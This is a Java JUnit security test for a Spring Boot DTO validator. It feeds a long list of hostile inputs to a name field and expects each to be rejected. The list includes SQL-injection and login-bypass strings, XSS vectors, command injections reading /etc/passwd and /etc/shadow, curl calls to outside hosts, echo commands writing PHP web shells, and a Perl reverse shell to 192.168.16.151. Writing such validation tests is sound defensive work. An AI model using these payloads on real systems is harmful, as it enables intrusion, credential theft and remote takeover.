package isep.ipp.pt.api.desofs.securityTests;

import isep.ipp.pt.api.desofs.Dto.TipoPacoteDTO.ControllerLayer.TipoPacoteDTOResponse;
import isep.ipp.pt.api.desofs.Dto.TipoPacoteDTO.ControllerLayer.TipoPacoteDTOSaveRequest;
import jakarta.validation.ConstraintViolation;
import jakarta.validation.Validation;
import jakarta.validation.Validator;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.CsvSource;
import org.springframework.boot.test.context.SpringBootTest;

import java.util.Set;

import static org.junit.jupiter.api.Assertions.*;

@SpringBootTest
class TipoPacoteDTOTest {

    private Validator validator;
    @BeforeEach
    void setUp() {
        validator = Validation.buildDefaultValidatorFactory().getValidator();
    }
    @ParameterizedTest
    @CsvSource({
            "ValidName, 1, 0",
            "'', 1, 2",
            "Invalid@Name, 1, 1",
            "ThisNameIsWayTooLong, 1, 1",
            "ValidName, , 1",
            "ValidName, -1, 1"
    })
    @DisplayName("Parameterized Test for TipoPacoteDTOResponse")
    public void testTipoPacoteDTOResponse(String nome, Long tipoPacoteId, int expectedViolationCount) {
        TipoPacoteDTOResponse response = new TipoPacoteDTOResponse(nome, tipoPacoteId);
        Set<ConstraintViolation<TipoPacoteDTOResponse>> violations = validator.validate(response);
        assertEquals(expectedViolationCount, violations.size());
    }

    @ParameterizedTest
    @CsvSource({
            "'1; DROP TABLE users;'",
            "'<script>alert(1)</script>'",
            "'<?php echo \\'Injected\\'; ?>'",
            "'<!--#exec cmd=\"/bin/cat /etc/passwd\"-->',",
            "'<!--#exec cmd=\"/bin/cat /etc/shadow\"-->'",
            "'<!--#exec cmd=\"/usr/bin/id;-->'",
            "'<!--#exec cmd=\"/usr/bin/id;-->'",
            "'/index.html|id|'",
            "';id;'",
            "';id'",
            "';netstat -a;'",
            "';system(\'cat /etc/passwd\')'",
            "'|id'",
            "'|/usr/bin/id'",
            "'|id|'",
            "'|/usr/bin/id|'",
            "'||/usr/bin/id|'",
            "'|id;', 1",
            "'||/usr/bin/id;'",
            "';id|'",
            "';|/usr/bin/id|'",
            "'\\n/bin/ls -al\\n'",
            "'\\n/usr/bin/id\\n'",
            "'\\nid\\n'",
            "'\\n/usr/bin/id;'",
            "'\\nid;'",
            "'\\n/usr/bin/id|'",
            "'\\nid|'",
            "';/usr/bin/id\\n'",
            "';id\\n'",
            "'|usr/bin/id\\n'",
            "'|nid\\n'",
            "'`id`'",
            "'`/usr/bin/id`'",
            "'a);id'",
            "'a;id'",
            "'a);id;'",
            "'a;id;'",
            "'a);id|'",
            "'a;id|'",
            "'a)|id'",
            "'a|id'",
            "'a)|id;'",
            "'a|id'",
            "'|/bin/ls -al'",
            "'a);/usr/bin/id'",
            "'a;/usr/bin/id'",
            "'a);/usr/bin/id;'",
            "'a;/usr/bin/id;'",
            "'a);/usr/bin/id|'",
            "'a;/usr/bin/id|'",
            "'a)|/usr/bin/id'",
            "'a|/usr/bin/id'",
            "'a)|/usr/bin/id;'",
            "'a|/usr/bin/id'",
            "';system(\'cat /etc/passwd\')'",
            "';system(\'id\')', 1",
            "';system(\'/usr/bin/id\')'",
            "'%0Acat /etc/passwd'",
            "'%0A/usr/bin/id'",
            "'%0Aid'",
            "'%0A/usr/bin/id%0A'",
            "'%0Aid%0A'",
            "'& ping -i 30 127.0.0.1 &'",
            "'& ping -n 30 127.0.0.1 &'",
            "'%0a ping -i 30 127.0.0.1 %0a'",
            "'`ping 127.0.0.1`'",
            "'%0Acat /etc/passwd'",
            "'%0A/usr/bin/id'",
            "'%0Aid'",
            "'%0A/usr/bin/id%0A'",
            "'%0Aid%0A', 1",
            "'& ping -i 30 127.0.0.1 &'",
            "'& ping -n 30 127.0.0.1 &'",
            "'%0a ping -i 30 127.0.0.1 %0a'",
            "'`ping 127.0.0.1`'",
            "||",
            "|",
            ";",
            "'",
            "'\"",
            "\"'",
            "&",
            "&&",
            "%0a",
            "%0a%0d",
            "%0Aid",
            "%0a id %0a",
            "%0Aid%0A",
            "%0a ping -i 30 127.0.0.1 %0a",
            "%0A/usr/bin/id",
            "%0A/usr/bin/id%0A",
            "%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1`",
            "#' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\"",
            "|ping -n 21 127.0.0.1",
            "%20{${phpinfo()}}",
            "%20{${sleep(20)}}",
            "%20{${sleep(3)}}",
            "a|id|", "a;id|",
            "a;id;",
            "a;id\n",
            "() { :;}; curl http://135.23.158.130/.testing/shellshock.txt?vuln=12",
            "| curl http://crowdshield.com/.testing/rce.txt",
            "& curl http://crowdshield.com/.testing/rce.txt",
            "; curl https://crowdshield.com/.testing/rce_vuln.txt",
            "&& curl https://crowdshield.com/.testing/rce_vuln.txt",
            "curl https://crowdshield.com/.testing/rce_vuln.txt",
            "curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt`",
            "#' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\"",
            "|curl https://crowdshield.com/.testing/rce_vuln.txt",
            "curl https://crowdshield.com/.testing/rce_vuln.txt",
            "$(`curl https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`)",
            "| dir", "; dir", "$(`dir`)", "& dir",
            "&&dir", "&& dir", "| dir C:\\", "; dir C:\\",
            "& dir C:\\", "&& dir C:\\", "dir C:\\",
            "| dir C:\\Documents and Settings\\*",
            "; dir C:\\Documents and Settings\\*",
            "& dir C:\\Documents and Settings\\*",
            "&& dir C:\\Documents and Settings\\*",
            "dir C:\\Documents and Settings\\*",
            "| dir C:\\Users", "; dir C:\\Users",
            "& dir C:\\Users", "&& dir C:\\Users",
            "dir C:\\Users", ";echo%20'<script>alert(1)</script>'",
            "echo '<img src=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX",
            "| echo \"<?php include($_GET['page'])| ?>\" > rfi.php",
            "; echo \"<?php include($_GET['page']); ?>\" > rfi.php",
            "& echo \"<?php include($_GET['page']); ?>\" > rfi.php",
            "&& echo \"<?php include($_GET['page']); ?>\" > rfi.php",
            "echo \"<?php include($_GET['page']); ?>\" > rfi.php",
            "| echo \"<?php system('dir $_GET['dir']')| ?>\" > dir.php",
            "; echo \"<?php system('dir $_GET['dir']'); ?>\" > dir.php",
            "& echo \"<?php system('dir $_GET['dir']'); ?>\" > dir.php",
            "&& echo \"<?php system('dir $_GET['dir']'); ?>\" > dir.php",
            "echo \"<?php system('dir $_GET['dir']'); ?>\" > dir.php",
            "| echo \"<?php system($_GET['cmd'])| ?>\" > cmd.php",
            "; echo \"<?php system($_GET['cmd']); ?>\" > cmd.php",
            "& echo \"<?php system($_GET['cmd']); ?>\" > cmd.php",
            "&& echo \"<?php system($_GET['cmd']); ?>\" > cmd.php",
            "echo \"<?php system($_GET['cmd']); ?>\" > cmd.php",
            ";echo '<script>alert(1)</script>'",
            "echo '<script>alert(1)</script>'// XXXXXXXXXXX",
            "echo '<script src=https://crowdshield.com/.testing/xss.js></script>'// XXXXXXXXXXX",
            "| echo \"use Socket;$i=\"192.168.16.151\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">;S\");open(STDOUT,\">;S\");open(STDERR,\">;S\");exec('/bin/sh -i');};\" > rev.pl",
            "; echo \"use Socket;$i=\"192.168.16.151\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">;S\");open(STDOUT,\">;S\");open(STDERR,\">;S\");exec('/bin/sh -i');};\" > rev.pl",
            "& echo \"use Socket;$i=\"192.168.16.151\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec('/bin/sh -i');};\" > rev.pl",
            "&& echo \"use Socket;$i=\"192.168.16.151\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec('/bin/sh -i');};\" > rev.pl",
            "echo \"use Socket;$i=\"192.168.16.151\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec('/bin/sh -i');};\" > rev.pl",
            "() { :;}; echo vulnerable 10",
            "eval('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')",
            "eval('ls')",
            "OR 1=1",
            "OR 1=0",
            "OR x=x",
            "OR x=y",
            "OR 1=1#",
            "OR 1=0#",
            "OR x=x#",
            "OR x=y#",
            "OR 1=1--",
            "OR 1=0--",
            "OR x=x--",
            "OR x=y--",
            "OR 3409=3409 AND ('pytW' LIKE 'pytW",
            "OR 3409=3409 AND ('pytW' LIKE 'pytY",
            "HAVING 1=1",
            "HAVING 1=0",
            "HAVING 1=1#",
            "HAVING 1=0#",
            "HAVING 1=1--",
            "HAVING 1=0--",
            "AND 1=1",
            "AND 1=0",
            "AND 1=1--",
            "AND 1=0--",
            "AND 1=1#",
            "AND 1=0#",
            "AND 1=1 AND '%'='",
            "AND 1=0 AND '%'='",
            "AND 1083=1083 AND (1427=1427",
            "AND 7506=9091 AND (5913=5913",
            "AND 1083=1083 AND ('1427=1427",
            //auth based sql injectio
            "'-'",
            "' '",
            "'&'",
            "'^'",
            "'*'",
            "' or ''-'",
            "' or '' '",
            "' or ''&'",
            "' or ''^'",
            "' or ''*'",
            "\"-\"",
            "\" \"",
            "\"&\"",
            "\"^\"",
            "\"*\"",
            "\" or \"\"-\"",
            "\" or \"\" \"",
            "\" or \"\"&\"",
            "\" or \"\"^\"",
            "\" or \"\"*\"",
            "or true--",
            "\" or true--",
            "' or true--",
            "\") or true--",
            "') or true--",
            "' or 'x'='x",
            "') or ('x')=('x",
            "')) or (('x'))=(('x",
            "\" or \"x\"=\"x",
            "\") or (\"x\")=(\"x",
            "\")) or ((\"x\"))=((\"x",
            "or 1=1",
            "or 1=1--",
            "or 1=1#",
            "or 1=1/*",
            "admin' --",
            "admin' #",
            "admin'/*",
            "admin' or '1'='1",
            "admin' or '1'='1'--",
            "admin' or '1'='1'#",
            "admin' or '1'='1'/*",
            "admin'or 1=1 or ''='",
            "admin' or 1=1",
            "admin' or 1=1--",
            "admin' or 1=1#",
            "admin' or 1=1/*",
            "admin') or ('1'='1",
            "admin') or ('1'='1'--",
            "admin') or ('1'='1'#",
            "admin') or ('1'='1'/*",
            "admin') or '1'='1",
            "admin') or '1'='1'--",
            "admin') or '1'='1'#",
            "admin') or '1'='1'/*",
            "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",
            "admin\" --",
            "admin\" #",
            "admin\"/*",
            "admin\" or \"1\"=\"1",
            "admin\" or \"1\"=\"1\"--",
            "admin\" or \"1\"=\"1\"#",
            "admin\" or \"1\"=\"1\"/*",
            "admin\"or 1=1 or \"\"=\"",
            "admin\" or 1=1",
            "admin\" or 1=1--",
            "admin\" or 1=1#",
            "admin\" or 1=1/*",
            "admin\") or (\"1\"=\"1",
            "admin\") or (\"1\"=\"1\"--",
            "admin\") or (\"1\"=\"1\"#",
            "admin\") or (\"1\"=\"1\"/*",
            "admin\") or \"1\"=\"1",
            "admin\") or \"1\"=\"1\"--",
            "admin\") or \"1\"=\"1\"#",
            "admin\") or \"1\"=\"1\"/*",
            "1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055",
            //XSS
            "'`\"><\\x3Cscript>javascript:alert(1)</script>",
            "'`\"><\\x00script>javascript:alert(1)</script>",
            "<img src=1 href=1 onerror=\"javascript:alert(1)\"></img>",
            "<audio src=1 href=1 onerror=\"javascript:alert(1)\"></audio>",
            "<video src=1 href=1 onerror=\"javascript:alert(1)\"></video>",
            "<body src=1 href=1 onerror=\"javascript:alert(1)\"></body>",
            "<image src=1 href=1 onerror=\"javascript:alert(1)\"></image>",
            "<object src=1 href=1 onerror=\"javascript:alert(1)\"></object>",
            "<script src=1 href=1 onerror=\"javascript:alert(1)\"></script>",
            "<svg onResize svg onResize=\"javascript:javascript:alert(1)\"></svg onResize>",
            "<title onPropertyChange title onPropertyChange=\"javascript:javascript:alert(1)\"></title onPropertyChange>",
            "<iframe onLoad iframe onLoad=\"javascript:javascript:alert(1)\"></iframe onLoad>",
            "<body onMouseEnter body onMouseEnter=\"javascript:javascript:alert(1)\"></body onMouseEnter>",
            "<body onFocus body onFocus=\"javascript:javascript:alert(1)\"></body onFocus>",
            "<frameset onScroll frameset onScroll=\"javascript:javascript:alert(1)\"></frameset onScroll>",
            "<script onReadyStateChange script onReadyStateChange=\"javascript:javascript:alert(1)\"></script onReadyStateChange>",
            "<html onMouseUp html onMouseUp=\"javascript:javascript:alert(1)\"></html onMouseUp>",
            "<body onPropertyChange body onPropertyChange=\"javascript:javascript:alert(1)\"></body onPropertyChange>",
            "<svg onLoad svg onLoad=\"javascript:javascript:alert(1)\"></svg onLoad>",
            "<body onPageHide body onPageHide=\"javascript:javascript:alert(1)\"></body onPageHide>",
            "<body onMouseOver body onMouseOver=\"javascript:javascript:alert(1)\"></body onMouseOver>",
            "<body onUnload body onUnload=\"javascript:javascript:alert(1)\"></body onUnload>",
            "<body onLoad body onLoad=\"javascript:javascript:alert(1)\"></body onLoad>",
            "<bgsound onPropertyChange bgsound onPropertyChange=\"javascript:javascript:alert(1)\"></bgsound onPropertyChange>",
            "<html onMouseLeave html onMouseLeave=\"javascript:javascript:alert(1)\"></html onMouseLeave>",
            "<html onMouseWheel html onMouseWheel=\"javascript:javascript:alert(1)\"></html onMouseWheel>",
            "<style onLoad style onLoad=\"javascript:javascript:alert(1)\"></style onLoad>",
            "<iframe onReadyStateChange iframe onReadyStateChange=\"javascript:javascript:alert(1)\"></iframe onReadyStateChange>",
            "<body onPageShow body onPageShow=\"javascript:javascript:alert(1)\"></body onPageShow>",
            "<style onReadyStateChange style onReadyStateChange=\"javascript:javascript:alert(1)\"></style onReadyStateChange>",
            "<frameset onFocus frameset onFocus=\"javascript:javascript:alert(1)\"></frameset onFocus>",
            "<applet onError applet onError=\"javascript:javascript:alert(1)\"></applet onError>",
            "<marquee onStart marquee onStart=\"javascript:javascript:alert(1)\"></marquee onStart>",
            "<script onLoad script onLoad=\"javascript:javascript:alert(1)\"></script onLoad>",
            "<html onMouseOver html onMouseOver=\"javascript:javascript:alert(1)\"></html onMouseOver>",
            "<html onMouseEnter html onMouseEnter=\"javascript:parent.javascript:alert(1)\"></html onMouseEnter>",
            "<body onBeforeUnload body onBeforeUnload=\"javascript:javascript:alert(1)\"></body onBeforeUnload>",
            "<html onMouseDown html onMouseDown=\"javascript:javascript:alert(1)\"></html onMouseDown>",
            "<marquee onScroll marquee onScroll=\"javascript:javascript:alert(1)\"></marquee onScroll>",
            "<xml onPropertyChange xml onPropertyChange=\"javascript:javascript:alert(1)\"></xml onPropertyChange>",
            "<frameset onBlur frameset onBlur=\"javascript:javascript:alert(1)\"></frameset onBlur>",
            "<applet onReadyStateChange applet onReadyStateChange=\"javascript:javascript:alert(1)\"></applet onReadyStateChange>",
            "<svg onUnload svg onUnload=\"javascript:javascript:alert(1)\"></svg onUnload>",
            "<html onMouseOut html onMouseOut=\"javascript:javascript:alert(1)\"></html onMouseOut>",
            "<body onMouseMove body onMouseMove=\"javascript:javascript:alert(1)\"></body onMouseMove>",
            "<body onResize body onResize=\"javascript:javascript:alert(1)\"></body onResize>",
            "<object onError object onError=\"javascript:javascript:alert(1)\"></object onError>",
            "<body onPopState body onPopState=\"javascript:javascript:alert(1)\"></body onPopState>",
            "<html onMouseMove html onMouseMove=\"javascript:javascript:alert(1)\"></html onMouseMove>",
            "<applet onreadystatechange applet onreadystatechange=\"javascript:javascript:alert(1)\"></applet onreadystatechange>",
            "<body onpagehide body onpagehide=\"javascript:javascript:alert(1)\"></body onpagehide>",
            "<svg onunload svg onunload=\"javascript:javascript:alert(1)\"></svg onunload>",
            "<applet onerror applet onerror=\"javascript:javascript:alert(1)\"></applet onerror>",
            "<body onkeyup body onkeyup=\"javascript:javascript:alert(1)\"></body onkeyup>",
            "<body onunload body onunload=\"javascript:javascript:alert(1)\"></body onunload>",
            "<iframe onload iframe onload=\"javascript:javascript:alert(1)\"></iframe onload>",
            "<body onload body onload=\"javascript:javascript:alert(1)\"></body onload>",
            "<html onmouseover html onmouseover=\"javascript:javascript:alert(1)\"></html onmouseover>",
            "<object onbeforeload object onbeforeload=\"javascript:javascript:alert(1)\"></object onbeforeload>",
            "<body onbeforeunload body onbeforeunload=\"javascript:javascript:alert(1)\"></body onbeforeunload>",
            "<body onfocus body onfocus=\"javascript:javascript:alert(1)\"></body onfocus>",
            "<body onkeydown body onkeydown=\"javascript:javascript:alert(1)\"></body onkeydown>",
            "<iframe onbeforeload iframe onbeforeload=\"javascript:javascript:alert(1)\"></iframe onbeforeload>",
            "<iframe src iframe src=\"javascript:javascript:alert(1)\"></iframe src>",
            "<svg onload svg onload=\"javascript:javascript:alert(1)\"></svg onload>",
            "<html onmousemove html onmousemove=\"javascript:javascript:alert(1)\"></html onmousemove>",
            "<body onblur body onblur=\"javascript:javascript:alert(1)\"></body onblur>",
            "\\x3Cscript>javascript:alert(1)</script>",
            "'\"`><script>/* *\\x2Fjavascript:alert(1)// */</script>",
            "<script>javascript:alert(1)</script\\0D",
            "<script>javascript:alert(1)</script\\0A",
            "<script>javascript:alert(1)</script\\0B",
            "<script charset=\"\\x22>javascript:alert(1)</script>",
            "<!--\\x3E<img src=xxx:x onerror=javascript:alert(1)> -->",
            "--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->",
            "--><!-- --\\x00> <img src=xxx:x onerror=javascript:alert(1)> -->",
            "<image/src/onerror=prompt(8)>",
            "<img/src/onerror=prompt(8)>",
            "<image src/onerror=prompt(8)>",
            "<img src/onerror=prompt(8)>",
            "<image src =q onerror=prompt(8)>",
            "<img src =q onerror=prompt(8)>",
            "</scrip</script>t><img src =q onerror=prompt(8)>",
            "'-prompt(8)-'",
            "\"-prompt(8)-\"",
            "\";a=prompt,a()//\"",
            "\"';a=prompt,a()//\"",
            "'-eval(\"window['pro'%2B'mpt'](8)\")-'",
            "\"-eval(\"window['pro'%2B'mpt'](8)\")-\"",
    })
    @DisplayName("Security Test for TipoPacoteDTOResponse")
    public void testSecurityVulnerabilities(String nome) {
        TipoPacoteDTOSaveRequest response = new TipoPacoteDTOSaveRequest(nome);
        Set<ConstraintViolation<TipoPacoteDTOSaveRequest>> violations = validator.validate(response);
        assertFalse(violations.isEmpty());
    }

}